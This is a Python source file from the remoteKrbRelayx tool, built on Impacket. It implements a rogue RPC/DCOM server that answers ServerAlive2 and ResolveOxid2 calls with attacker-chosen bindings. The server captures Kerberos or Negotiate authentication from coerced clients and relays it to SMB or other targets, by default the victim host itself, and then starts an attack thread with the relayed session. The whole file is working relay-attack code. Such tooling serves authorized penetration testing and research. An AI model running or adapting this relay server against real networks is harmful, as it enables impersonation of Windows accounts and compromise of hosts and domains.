#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information
#
# RPC Relay Server inspired from DCERPCServer
#
# Authors:
#  Sylvain Heiniger / Compass Security (@sploutchy / https://www.compass-security.com)
#
# Description:
#             This is the RPC server which relays the connections
# to other protocols
#
# Fitted for remoteKrbRelayx by Ole Fredrik Borgundvåg Berg (@olefredrikberg) / Helse- og KommuneCERT
#

import socketserver
from impacket.dcerpc.v5.epm import *
from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5.dcomrt import *
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from remotekrbrelayx.krbrelayx.lib.utils.kerberos import get_auth_data_kerberos, get_auth_data_negotiate

class RPCRelayServer(Thread):
    class RPCSocketServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.attack_thread = None
            self.daemon_threads = True
            if self.config.ipv6:
                self.address_family = socket.AF_INET6
            socketserver.TCPServer.allow_reuse_address = True
            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class RPCHandler(socketserver.BaseRequestHandler):
        def __init__(self, request, client_address, server):
            self.target = None
            self.transport = None
            self.request_header = None
            self.request_pdu_data = None
            self.request_sec_trailer = None
            self.rpc_auth = {
                'kerberos': RPC_C_AUTHN_GSS_KERBEROS,
                'negotiate': RPC_C_AUTHN_GSS_NEGOTIATE,
                'ntlm': RPC_C_AUTHN_WINNT
            }[server.config.authenticationType]
            self.localAddress = '%s[%d]' % (server.config.coerceTo, server.config.listeningPort)
            self.alternateAdress = None
            if server.config.alternateServer:
                if server.config.alternateProtocol == 'smb':
                    self.alternateAdress = '%s[\\pipe\\%s]' % (server.config.alternateServer, server.config.alternateSmbPipe)
                    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/7063c7bd-b48b-42e7-9154-3c2ec4113c0d : RPC over SMB MUST use a protocol identifier of 0x0F instead of 0x10
                    self.alternateTowerId = 0xf 
                elif server.config.alternateProtocol == 'rpc':
                    self.alternateAdress = '%s[%d]' % (server.config.alternateServer, server.config.alternateRpcPort)
                    self.alternateTowerId = TOWERID_DOD_TCP

            self.client = None
            socketserver.BaseRequestHandler.__init__(self, request, client_address, server)

        def setup(self):
            self.transport = DCERPCServer(self.request)
            IObjectExporterCallBacks = {
                5: self.send_ServerAlive2Response,
                4: self.send_ResolveOxid2Response,
            }
            self.transport.addCallbacks(bin_to_uuidtup(IID_IObjectExporter), "135", IObjectExporterCallBacks)

            if self.server.config.target is None:
                # Reflection mode, defaults to SMB at the target, for now
                self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % self.client_address[0])

        def send_ServerAlive2Response(self, request):
            response = ServerAlive2Response()
            self.target = self.server.config.target.getTarget(multiRelay=False)
            stringBindings = [(TOWERID_DOD_TCP, self.localAddress)]
            securityBindings = [(self.rpc_auth, self.server.config.spn)]

            array = b''
            for wTowerId, aNetworkAddr in stringBindings:
                array += wTowerId.to_bytes(1, byteorder='little')  # formatting in a ushort is performed later
                array += aNetworkAddr.encode('utf8') + b'\x00'
            array += b'\x00'
            response['ppdsaOrBindings']['wSecurityOffset'] = len(array)
            for wAuthnSvc, aPrincName in securityBindings:
                array += wAuthnSvc.to_bytes(1, byteorder='little')
                array += b'\xff'  # This should be \xff\xff but as it's formatted on a ushort, it doesn't work |-(
                array += aPrincName.encode('utf8') + b'\x00'
            array += b'\x00'
            response['ppdsaOrBindings']['wNumEntries'] = len(array)
            response['ppdsaOrBindings']['aStringArray'] = array

            return response

        def send_ResolveOxid2Response(self, request):
            response = ResolveOxid2Response()
            self.target = self.server.config.target.getTarget(multiRelay=False)
            if self.alternateAdress:
                stringBindings = [(self.alternateTowerId, self.alternateAdress)]
            else:
                stringBindings = [(TOWERID_DOD_TCP, self.localAddress)]
            securityBindings = [(self.rpc_auth, self.server.config.spn)]

            array = b''
            for wTowerId, aNetworkAddr in stringBindings:
                array += wTowerId.to_bytes(1, byteorder='little')  # formatting in a ushort is performed later
                array += aNetworkAddr.encode('utf8') + b'\x00'
            array += b'\x00'
            response['ppdsaOxidBindings']['wSecurityOffset'] = len(array)
            for wAuthnSvc, aPrincName in securityBindings:
                array += wAuthnSvc.to_bytes(1, byteorder='little')
                array += b'\xff'  # This should be \xff\xff but as it's formatted on a ushort, it doesn't work |-(
                array += aPrincName.encode('utf8') + b'\x00'
            array += b'\x00'
            response['ppdsaOxidBindings']['wNumEntries'] = len(array)
            response['ppdsaOxidBindings']['aStringArray'] = array
            response['pAuthnHint'] = RPC_C_AUTHN_LEVEL_CONNECT

            return response

        def handle(self):
            try:
                while True:
                    data = self.transport.recv()
                    if data is None:
                        # No data: connection closed
                        LOG.debug('RPC: Connection closed by client')
                        return
                    response = self.handle_single_request(data)
                    # if not response:
                    # Nothing more to say, close connection
                    #    return
                    if response:
                        LOG.debug('RPC: Sending packet of type %s' % msrpc_message_type[response['type']])
                        self.transport.send(response)
            except KeyboardInterrupt:
                raise
            except ConnectionResetError:
                LOG.error("RPC connection reset. Attack may still be ongoing.")
            except Exception as e:
                LOG.debug("Exception:", exc_info=True)
                LOG.error('Exception in RPC request handler: %s' % e)

        def handle_single_request(self, data):
            self.request_header = MSRPCHeader(data)
            req_type = self.request_header['type']
            LOG.debug('RPC: Received packet of type %s' % msrpc_message_type[req_type])
            if req_type in (MSRPC_BIND, MSRPC_ALTERCTX):
                self.request_pdu_data = MSRPCRelayBind(self.request_header['pduData'])
            elif req_type == MSRPC_AUTH3:
                # We don't need the data and don't have AUTH3 Structure anyway
                # self.requestPduData = MSRPCAUTH3(self.requestHeader['pduData'])
                pass
            elif req_type == MSRPC_REQUEST:
                # This is a RPC request, we try to answer it the best we can.
                return self.transport.processRequest(data)
            else:
                LOG.error('Packet type received not supported (yet): %a' % msrpc_message_type[req_type])
                return self.send_error(MSRPC_STATUS_CODE_NCA_S_UNSUPPORTED_TYPE)

            if self.request_header['auth_len'] <= 0:
                if req_type == MSRPC_BIND:
                    # Let's answer to the bind anyway, maybe a second request with authentication comes later
                    LOG.debug('Answering to a BIND without authentication')
                    return self.transport.processRequest(data)
                LOG.error('Packet is no BIND and does not contain authentication')
                return self.send_error(MSRPC_STATUS_CODE_RPC_S_BINDING_HAS_NO_AUTH)

            self.request_sec_trailer = SEC_TRAILER(self.request_header['sec_trailer'])

            if req_type not in (MSRPC_BIND, MSRPC_ALTERCTX, MSRPC_AUTH3):
                raise Exception('Packet type received not supported (yet): %s' % msrpc_message_type[req_type])
            auth_type = self.request_sec_trailer['auth_type']
            if auth_type == RPC_C_AUTHN_GSS_KERBEROS:
                token = get_auth_data_kerberos(self.request_header['auth_data'], self.server.config)
            elif auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
                token = get_auth_data_negotiate(self.request_header['auth_data'], self.server.config)
            else:
                LOG.info('Auth type received not supported: %d' % auth_type)
                return self.transport.processRequest(data)
            new_token = self.do_relay(token)
            if new_token is None:
                return self.transport.processRequest(data)
            return self.bind(new_token)

        def bind(self, challengeMessage=b''):
            bindAck = MSRPCRelayBindAck()

            bindAck['max_tfrag'] = self.request_pdu_data['max_tfrag']
            bindAck['max_rfrag'] = self.request_pdu_data['max_rfrag']
            bindAck['assoc_group'] = 0x12345678  # whatever, but not 0!!!

            if not self.request_pdu_data.getCtxItems():
                # No CTX Items
                raise Exception('Bind request with no CTX Item.')
            for requestItem in self.request_pdu_data.getCtxItems():
                syntax, version = bin_to_uuidtup(requestItem['TransferSyntax'])
                item = CtxItemResult()
                # Bind Time Feature Negotiation need to be answered properly |-(
                if syntax.startswith(MSRPC_BIND_TIME_FEATURE_NEGOTIATION_PREFIX) and version == "1.0":
                    item['Result'] = MSRPC_CONT_RESULT_NEGOTIATE_ACK
                    item['Reason'] = MSRPC_BIND_TIME_FEATURE_NEGOTIATION_SECURITY_CONTEXT_MULTIPLEXING_SUPPORTED_BITMASK | MSRPC_BIND_TIME_FEATURE_NEGOTIATION_KEEP_CONNECTION_ON_ORPHAN_SUPPORTED_BITMASK
                    item['TransferSyntax'] = "\x00" * 20
                else:
                    if requestItem['TransferSyntax'] == DCERPC.NDR64Syntax:
                        item['Result'] = MSRPC_CONT_RESULT_PROV_REJECT
                        item['Reason'] = 2
                        item['TransferSyntax'] = ('00000000-0000-0000-0000-000000000000',0.0)
                    # Accept all other Context Items, because we want authentication!
                    else:
                        item['Result'] = MSRPC_CONT_RESULT_ACCEPT
                        item['TransferSyntax'] = requestItem['TransferSyntax']
                        self.transport._boundUUID = requestItem['AbstractSyntax']
                bindAck.addCtxItem(item)
            # TODO: This is probably not generic enough :(
            bindAck['SecondaryAddr'] = "9999"

            packet = MSRPCHeader()
            if self.request_header['type'] == MSRPC_BIND:
                packet['type'] = MSRPC_BINDACK
            elif self.request_header['type'] == MSRPC_ALTERCTX:
                packet['type'] = MSRPC_ALTERCTX_R
            else:
                raise Exception('Message type %d is not supported in bind' % self.request_header['type'])
            packet['pduData'] = bindAck.getData()
            packet['call_id'] = self.request_header['call_id']
            packet['flags'] = self.request_header['flags']

            if challengeMessage != b'':
                secTrailer = SEC_TRAILER()
                secTrailer['auth_type'] = self.request_sec_trailer['auth_type']
                # TODO: Downgrading auth_level?
                secTrailer['auth_level'] = self.request_sec_trailer['auth_level']
                # TODO: What is this number?
                secTrailer['auth_ctx_id'] = self.request_sec_trailer['auth_ctx_id']

                pad = (4 - (len(packet.get_packet()) % 4)) % 4
                if pad != 0:
                    packet['pduData'] += b'\xFF' * pad
                    secTrailer['auth_pad_len'] = pad

                packet['sec_trailer'] = secTrailer
                packet['auth_data'] = challengeMessage
                packet['auth_len'] = len(challengeMessage)

            return packet  # .get_packet()

        def send_error(self, status):
            packet = MSRPCRespHeader(self.request_header.getData())
            request_type = self.request_header['type']
            if request_type == MSRPC_BIND:
                packet['type'] = MSRPC_BINDNAK
            else:
                packet['type'] = MSRPC_FAULT
            if status:
                packet['pduData'] = pack('<L', status)
            return packet

        def do_relay(self, authdata):
            if 'domain' in authdata and 'username' in authdata and authdata['domain'] is not None and authdata['username'] is not None:
                self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            if 'service' in authdata and authdata['service'] is not None:
                LOG.info("Got kerberos auth for spn %s" % authdata['service'])
                if authdata['service'].lower() != self.server.config.spn.lower():
                    # Wrong SPN, we cannot relay this
                    return None
            parsed_target = self.server.config.target.originalTargets[0]
            try:
                if self.client is None:
                    LOG.info("Starting attack against %s://%s" % (parsed_target.scheme, parsed_target.hostname))
                    self.client = self.server.config.protocolClients[parsed_target.scheme.upper()](self.server.config, parsed_target)
                    finished, result = self.client.initConnection(authdata)
                else:
                    finished, result = self.client.sendNegotiate(authdata)
            except Exception as e:
                LOG.error("Error authenticating during attack. Closing down: %s" % e)
                self.server.shutdown()
                return None

            if not finished:
                return result
            # We have an attack.. go for it
            attack = self.server.config.attacks[parsed_target.scheme.upper()]
            self.server.attack_thread = attack(self.server.config, self.client.session, self.authUser)
            self.server.attack_thread.start()
            return
 
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):
        LOG.info("Setting up RPC Server on port %d"%self.config.listeningPort)

        self.server = self.RPCSocketServer((self.config.interfaceIp, self.config.listeningPort), self.RPCHandler,
                                           self.config)

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            pass
        LOG.info('Shutting down RPC Server')
        self.server.server_close()

